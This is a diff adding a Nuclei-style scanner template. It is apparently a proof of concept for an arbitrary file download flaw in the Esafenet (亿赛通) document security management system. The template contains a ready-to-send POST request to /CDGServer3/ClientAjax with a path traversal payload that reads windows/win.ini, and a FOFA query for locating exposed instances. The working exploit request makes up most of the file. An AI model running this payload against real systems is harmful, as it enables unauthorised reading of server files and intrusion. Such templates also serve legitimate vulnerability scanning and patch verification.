@@ -1,0 +1,48 @@
+id: poc-powcg64dmzl5e2gb
+info:
+  name: 亿赛通 电子文档安全管理系统 ClientAjax 任意文件下载
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/powcg64dmzl5e2gb'
+  tags: lfi,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: powcg64dmzl5e2gb
+    fofa: title="电子文档安全管理系统"
+http:
+- raw:
+  - 'POST /CDGServer3/ClientAjax HTTP/1.1
+
+
+    Connection: close
+
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    Accept-Encoding: gzip, deflate, br
+
+
+
+
+    command=downclientpak&InstallationPack=../../../../../../../../../../windows/win.ini&forward=index.jsp
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    support
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
